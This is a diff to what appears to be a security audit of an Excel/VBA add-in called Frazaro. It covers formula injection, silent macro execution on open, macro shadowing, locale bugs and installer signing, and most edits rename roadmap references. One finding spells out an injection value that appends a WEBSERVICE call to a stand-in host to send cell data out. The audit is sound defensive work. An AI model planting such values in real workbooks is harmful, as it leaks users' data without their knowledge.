+- Dedupe: grepped both roadmaps for `OPEN`, `quot`, `UninstallDelete`. BETA_REARVIEW.md:2080-2084 (SIG.1 write-up, "none minted") notes that the consent records under `HKCU\Software\VB and VBA Program Settings\Frazaro` survive uninstall. That is a different leftover and was also never filed. DEPLOY.md:103-110 records a live install → uninstall run that did not toggle the add-in in between. Not filed.
 - Fix direction: normalise before comparing in both copies: strip surrounding quotes and a leading `/R `, then compare case-insensitively. Compact the OPEN slots after a delete. Have `[UninstallDelete]` or `[Registry]` with `uninsdeletekey` also remove `HKCU\Software\VB and VBA Program Settings\Frazaro`.
 - Ratchet-able?: a small parity check that Frazaro.iss's Register/Unregister and VLA_IDE's twins apply the same normalisation. Otherwise live-test only.
 
@@ -1378,9 +1378,9 @@ $issues = $collisions.Count + $dups.Count + $retiredHits
 exit ([Math]::Min($issues, 1))
 ```
   There is no assertion that `$governedPaths.Count -gt 0`, and no floor on the number of IDs parsed. No `ALPHA*_ROADMAP.md` exists today, so the two BETA files are the whole governed set.
-- Failure scenario (reproduced): rename `docs/BETA_ROADMAP1.md` to `ROADMAP_B1.md` and `docs/BETA_ROADMAP2.md` to `ROADMAP_B2.md` (the kind of rename the EDITION-MANIFEST moves already did to phrasebooks). Output shrinks from 523 lines to 32, with an empty high-water table, and ends `=== CHECK: clean - 0 governed collisions ... ===`, exit 0. The same applies if the roadmap moves to a subfolder. The header already records one silent hole in this script (the `{1,4}` prefix cap). This is the same shape one level up.
+- Failure scenario (reproduced): rename `docs/BETA_REARVIEW.md` to `ROADMAP_B1.md` and `docs/BETA_ROADMAP.md` to `ROADMAP_B2.md` (the kind of rename the EDITION-MANIFEST moves already did to phrasebooks). Output shrinks from 523 lines to 32, with an empty high-water table, and ends `=== CHECK: clean - 0 governed collisions ... ===`, exit 0. The same applies if the roadmap moves to a subfolder. The header already records one silent hole in this script (the `{1,4}` prefix cap). This is the same shape one level up.
 - Live repro: not needed.
-- Dedupe: grepped both roadmaps for `ALPHA*_ROADMAP` and `governed set`. Only BETA_ROADMAP1.md:3671 describes the set. Not filed.
+- Dedupe: grepped both roadmaps for `ALPHA*_ROADMAP` and `governed set`. Only BETA_REARVIEW.md:3671 describes the set. Not filed.
 - Fix direction: fail when `$governedPaths.Count -eq 0` or when the parsed-definition count drops below a held floor, for example the current count minus a margin.
 - Ratchet-able?: yes, as a class. See "Recurring patterns" below: add `if (<inputs>.Count -eq 0) { Write-Error ... }` after every discovery glob.
 
@@ -1452,7 +1452,7 @@ git push origin $tag                     # exit code never read
   - If A1 is crafted, for example `x"")) (query t)",reports)&WEBSERVICE("http://h/"&B1)&DATALOG("(query t`, the value closes the DATALOG string and appends arbitrary worksheet functions to a live formula Frazaro wrote. That is the class-7 "formula written with user text" injection, and it reaches the network with no Frazaro code involved (SD-13).
   - For `{val}` in `datalog-filter-place`, a Double goes through `&`, a locale-dependent CStr. `80000.5` becomes `80000,5` on a comma-decimal machine, which DATALOG reads as two tokens. That part extends EN.* locale, not new.
 - Live repro: in Excel, put `x""` in A1, run the two sentences above, and read E2's `.Formula`. Then try a value that closes the string and appends `&1`, and check that the cell evaluates the appended part.
-- Dedupe: grepped for `interpolate` and `escap` (BETA_ROADMAP1.md:9543-9566 L-INTERPOLATE: its refusals cover template-must-be-literal, unknown key and unused argument, with no escaping) and for `person` (BETA_ROADMAP1.md:8190 is about case folding only). Not filed. The numeric-locale half: extends EN.*.
+- Dedupe: grepped for `interpolate` and `escap` (BETA_REARVIEW.md:9543-9566 L-INTERPOLATE: its refusals cover template-must-be-literal, unknown key and unused argument, with no escaping) and for `person` (BETA_REARVIEW.md:8190 is about case folding only). Not filed. The numeric-locale half: extends EN.*.
 - Fix direction: give interpolate an escaping hole form, for example `{person:fq}`, that doubles `"` (formula-string escaping) and renders numbers with `Str$`/invariant formatting. Alternatively make `datalog-*-place` take `:text` quoted literals only. Fix the false comment either way.
 - Ratchet-able?: yes. Scan `scripts/**/*.vla` for `(interpolate "=` (a formula template) whose holes sit inside `\"`-delimited regions without an escaping marker.
 
@@ -1478,7 +1478,7 @@ $guardPattern = 'AutomationSecurity\s*=\s*3\b'   # receiver not checked
 - Failure scenario: a local, unmarked workbook runs `Open workbook "C:\Users\me\Downloads\q3.xlsm".` The target was downloaded, and its `Workbook_Open` runs silently under Frazaro's call, bypassing the Enable Content bar the user would see opening it by hand.
   - Also, the ratchet's receiver-agnostic guard regex is satisfied by `Application.AutomationSecurity = 3` (Excel's own), which does not protect a Word instance. And it cannot see `With wd.Documents` / `.Open` or `Set d = wd.Documents: d.Open`.
 - Live repro: create `t.xlsm` with `Private Sub Workbook_Open(): MsgBox "ran": End Sub`, mark it with a Zone.Identifier (ZoneId=3), then run an interpreted `open workbook` sentence on it from an unmarked local host. Does "ran" appear? Also check whether Microsoft's internet-macro block still stops it, which would lower the severity.
-- Dedupe: SEC.13 (BETA_ROADMAP2.md:129) is Word-only by title and fix. SEC.8 (:124) gates host provenance. Grepped for `Workbooks.Open`, `Workbook_Open`, `AutomationSecurity`. No Excel item exists.
+- Dedupe: SEC.13 (BETA_ROADMAP.md:129) is Word-only by title and fix. SEC.8 (:124) gates host provenance. Grepped for `Workbooks.Open`, `Workbook_Open`, `AutomationSecurity`. No Excel item exists.
 - Fix direction: wrap the interpreter's `open` in save, set `Application.AutomationSecurity = 3`, open, restore (restore on the error path too). Widen the ratchet to `(Documents|Workbooks|Presentations)\s*\.\s*Open` and to `.Open` inside `With ...Documents|Workbooks`. Require the guard's receiver to match the open's receiver.
 - Ratchet-able?: yes, by extending the existing ratchet as above.
 
@@ -1513,7 +1513,7 @@ Set mUserFnWords = New Collection
 - Class: 9/10 (supply chain; last definition wins) / **Severity: low-medium** (latent: the current `english.vla` and `prelude.vla` share no names, which I checked by diffing the 193 and 46 macro names) / Verdict: CONFIRMED by reading.
 - Where: `src/VLA.bas:2602` (`Set mMacros.Item(Fold(mname)) = rec`, an overwrite). `src/VLA_SentenceEngine.bas:9176-9227`: `RegisterVocabMacro` checks collisions only against other vocabulary macros (`mVocabMacroNames`), and `VlaProbeMacroForm` deliberately runs without the prelude.
 - Failure scenario: a community phrasebook defines `(defmacro (with-no-alerts …) …)` or `(cells-of …)`. Pass 1 collects the prelude first and the vocabulary later, so the phrasebook's version replaces the prelude's globally, including inside other prelude macros. Every sentence built on it changes meaning with no message. SEC.3 (per-layer provenance) would record it after the fact but does not refuse it.
-- Dedupe: searched for "redefin", "shadow.*macro". ROADMAP1:12982 describes the last-wins behaviour as a performance fact, not as a hazard.
+- Dedupe: searched for "redefin", "shadow.*macro". BETA_REARVIEW:12982 describes the last-wins behaviour as a performance fact, not as a hazard.
 - Fix direction: seed `mVocabMacroNames` with the prelude's macro names (tagged "prelude"), so the existing `english-vocab-macro-name-collision` fires.
 - Ratchet-able?: yes. A test that loads each shipped phrasebook and asserts it has no name in common with the prelude.
 
@@ -1609,7 +1609,7 @@ Case "range", "cell", "column"
 ```
 - Failure scenario: with Windows set to Turkish, rendering `(add! total 5)` produces `İncrease total by 5.` (dotted capital I). EnTokenize refuses `İ` because IsWordChar is ASCII-only, so EnglishRenderSelfCheck reports every i-initial rule as "did not re-parse at all". Cells like `i5` render as `İ5`, and refusal messages at :6562/:7065/:7143 show `İ5` too.
 - Live repro: set Region to Turkish and run `?EnglishRenderSelfCheck()`. Compare the failure count with en-US.
-- Dedupe: R6 exposure is acknowledged in ROADMAP1 L16608-16626 ("33 sites across 9 modules"), with no item for the translator's own sites. This extends R6.
+- Dedupe: R6 exposure is acknowledged in BETA_REARVIEW L16608-16626 ("33 sites across 9 modules"), with no item for the translator's own sites. This extends R6.
 - Fix direction: add an invariant `VLA_Identity.UpperAscii` (the mirror image of Fold) and use it for display casing of ASCII tokens.
 - Ratchet-able?: yes. A grep for `\b[LU]Case\$?\(` outside VLA_Identity.bas and VLA_Runtime's user-facing builtins, with a ceiling (this file: 24).
 
@@ -1631,7 +1631,7 @@ Next
 ```
 - Failure scenario: each Check reloads the phrasebook, so each Check rebuilds a 110 KB string by repeated concatenation (roughly #directives × average length in copies) and does O(n²) positional Collection walks. The project already recorded this exact mechanism ("a VBA Collection read by index is O(n²)", PROLOG.28, and P-TOK). Growth of the phrasebook turns it into latency on every Check.
 - Live repro: `VlaProfileAll`, then time `EnglishLoadVocabulary` on english.vla. Double the file by duplicating its test proofs and check whether the time roughly quadruples.
-- Dedupe: PF.8 (open) covers `mVocabMacros` only. BuildExpandedBlob is mentioned in ROADMAP1 only for its format. This **extends PF.8**.
+- Dedupe: PF.8 (open) covers `mVocabMacros` only. BuildExpandedBlob is mentioned in BETA_REARVIEW only for its format. This **extends PF.8**.
 - Fix direction: use the existing SbAdd/SbText builder (this file already has it, :4520) and `For Each` over the parallel collections, or collect them into arrays once.
 - Ratchet-able?: yes. Flag `For <v> = 1 To <c>.Count` loops that call `<c>.Item(<v>)` (the P-TOK/PROLOG.28 shape), and `<s> = <s> & ...` inside loops in translate/load paths.
 
@@ -1840,7 +1840,7 @@ if ($sig.Status -eq 'NotSigned' -or $sig.Status -eq 'HashMismatch' -or $subj -ne
   - `New-SelfSignedCertificate` defaults to an exportable private key.
   - No `-TimestampServer` means the Authenticode signature stops validating when the cert expires (SD-13 forbids network, so this should be an explicit accepted decision).
   - With several valid certs of that CN, `Select-Object -First 1` picks arbitrarily.
-- Dedupe: SIG.8 (BETA_ROADMAP2.md:154) covers the *VBA* cert's publication, rotation and timestamp questions. The installer cert's silent re-mint and the release gate's subject-only match are not in it. This extends SIG.8.
+- Dedupe: SIG.8 (BETA_ROADMAP.md:154) covers the *VBA* cert's publication, rotation and timestamp questions. The installer cert's silent re-mint and the release gate's subject-only match are not in it. This extends SIG.8.
 - Fix direction: pin the expected thumbprint in a committed file, check `$sig.SignerCertificate.Thumbprint` against it in build_installer.ps1 and release.ps1, and make sign_installer refuse (not mint) when the pinned cert is missing, with minting as an explicit `-MintNew` switch. Use `-KeyExportPolicy NonExportable`.
 - Ratchet-able?: no. This is a release-time check.
 
@@ -1886,7 +1886,7 @@ if ($sig.Status -eq 'NotSigned' -or $sig.Status -eq 'HashMismatch' -or $subj -ne
 - Every emitted module starts with `Option Explicit` (VlaTranspile:1045, golden:1).
 - Unqualified `cells(...)`/`range(...)`/`columns(...)` in the emitted `main` are by design ("Work on sheet X" activates first). The interpreter has the same semantics. The table-macro ActiveSheet dependence is already IO.4.
 - Try label flow (`vla_tryf_N` → `Resume vla_tryr_N` → re-arm → `vla_tryd_N`): both exits re-arm correctly for a single, un-nested Try. See #2 for the nested case.
-- `VLA_Digest` SHA-256: the arithmetic is sound. `VlaSha256HexOfAsciiText`'s ANSI-code-page collision is already recorded (ROADMAP1:20919) and it has no live caller outside tests.
+- `VLA_Digest` SHA-256: the arithmetic is sound. `VlaSha256HexOfAsciiText`'s ANSI-code-page collision is already recorded (BETA_REARVIEW:20919) and it has no live caller outside tests.
 - `VLA_Provenance`: parsing is range-checked and length-capped (SEC.8 pinned it). `UncapturedRefuses = False` is a recorded residual. A smell, not filed: `VlaPathIsDemonstrablyLocal` treats any `X:\` drive as local, including a mapped network drive or a FAT or exFAT USB stick where the mark cannot be stored. So a workbook with no readable mark that was copied there is allowed, while the same file on the UNC path is refused. This is inconsistent, but Office has the same blind spot.
 - `VLA_Browser`: the prelude override is cleared on both exits.
 - `MakeButtonHelperText`: its `On Error Resume Next` is confined to its own helper procedure, so it does not disturb the caller's handler.
@@ -1920,7 +1920,7 @@ if ($sig.Status -eq 'NotSigned' -or $sig.Status -eq 'HashMismatch' -or $subj -ne
 - Cut opacity: `not`/`findall` get a local cut signal (`SolveIsolated`), which is correct. Cut in `or` branches is transparent, which is correct. Cut in an `if` condition is transparent, a documented divergence from ISO. The "first wins" guard on nested cut signals (PROLOG.14) traces correctly.
 - `between`: the empty range yields nothing, the range cap is `PROLOG_MAX_WORK - 1` with the right off-by-one, test mode is value-based, and non-whole bounds are refused.
 - `length`/`member`/`nth`/`append` with an unbound or partial list: refused by name, a documented choice (PROLOG.13). `append` split mode is O(n²) but capped at 1,000 items.
-- Text numbers in arithmetic (`(> "42" 41)` succeeds while `(number? "42")` is false): adjudicated in ROADMAP1 around line 15286.
+- Text numbers in arithmetic (`(> "42" 41)` succeeds while `(number? "42")` is false): adjudicated in BETA_REARVIEW around line 15286.
 - Blank cells become empty text (`"`), which makes arithmetic on them refuse by name. That is acceptable, apart from the `not` amplification in finding 2.
 - `mDepth` left counted in after a raise: zeroed in `PrologRun`. Every exit from `SolveGoalList` goes through `leave:`, enforced by `check_prolog_budgets.ps1`.
 - User-written list recursion dies at about 60 elements because of `PROLOG_MAX_DEPTH`: known and documented (PROLOG.28, "a chain deeper than PROLOG follows"), and an accepted risk under SEC.14.
@@ -1939,7 +1939,7 @@ if ($sig.Status -eq 'NotSigned' -or $sig.Status -eq 'HashMismatch' -or $subj -ne
 - `''` string escape in Tokenize is correct, including `''` at the end of the text. An unterminated string or comment is refused by name.
 - COUNT(col) counting blanks, SUM/AVG refusing a blank as non-numeric, blanks in WHERE: all SQL.9.
 - SUM over zero rows = 0 (SQLite gives NULL) and MIN/MAX/AVG over zero rows refused: documented choices (SQL.4 and Relation headers).
-- All-blank source rows are dropped from SQL tables: known and documented (BETA_ROADMAP1 ~9663, ~17573).
+- All-blank source rows are dropped from SQL tables: known and documented (BETA_REARVIEW ~9663, ~17573).
 - The `As New` in-loop trap: every loop-scoped Collection in SqlRunJoin, EvalCteBody, SqlRunWith, RangeColumnNames and ParseAtom uses explicit `Set = New`. `Dim pair As New Collection` in JoinIndexPut is per-call, not per-loop, so it is safe.
 - Recursive CTE: UNION ALL only, shape checks, round ceiling, delta substitution through a fresh table record each round. Correct. UNION (dedup) recursion is refused (documented shape).
 - Set-op precedence (INTERSECT tighter, others left-associative) and result headers from the first branch match SQLite.
@@ -1989,7 +1989,7 @@ if ($sig.Status -eq 'NotSigned' -or $sig.Status -eq 'HashMismatch' -or $subj -ne
 - `build_examples.ps1`: no Office automation, XML text goes through `SecurityElement.Escape`, numbers use InvariantCulture. The sheet passwords ("close") are documented sample content, not secrets.
 - Secrets: no tokens, keys, passwords or network calls in tools/ or installer/. The certificates live in `Cert:\CurrentUser\My`, not in files.
 - Frazaro.iss: per-user (`PrivilegesRequired=lowest`, `{userappdata}`), no `[Run]`/`[UninstallRun]`, does not touch Trust Center or trusted locations. The user-writable install dir and the external `prelude.vla`/`english.vla` overriding the embedded copies are SEC.16 (accepted, not reported).
-- Uninstall leaves `HKCU\Software\VB and VBA Program Settings\Frazaro`: already written up in BETA_ROADMAP1.md:2080-2084 (SIG.1 notes). Not re-reported beyond a pointer in finding 6.
+- Uninstall leaves `HKCU\Software\VB and VBA Program Settings\Frazaro`: already written up in BETA_REARVIEW.md:2080-2084 (SIG.1 notes). Not re-reported beyond a pointer in finding 6.
 - `toggle_vba_warning_level.ps1`: state file in `%TEMP%` (predictable name, but a same-user attacker already owns HKCU). It hardcodes Office 16.0 and refuses cleanly otherwise. It restores only via `-Restore`, and a lost state file is reported, not guessed. Dev-only. Acceptable.
 - Phrasebooks: no `raw` forms in prelude.vla, english.vla or espanol.vla. `check_rule_coverage` shows 0 english rules with zero tests. All 19 espanol-vla rules are each followed by a test-success, although no static check covers espanol.vla (rule_coverage is English-only; an add-on for the next audit). The espanol `keyword-alias` global rewrite of `si`/`es`/`veces` is documented in the file itself (espanol.vla:210-231) as a known collision class.
 - `release.ps1` signature status accepting `UnknownError`/`NotTrusted` is correct for a self-signed cert (the identity problem is finding 9, not the status).
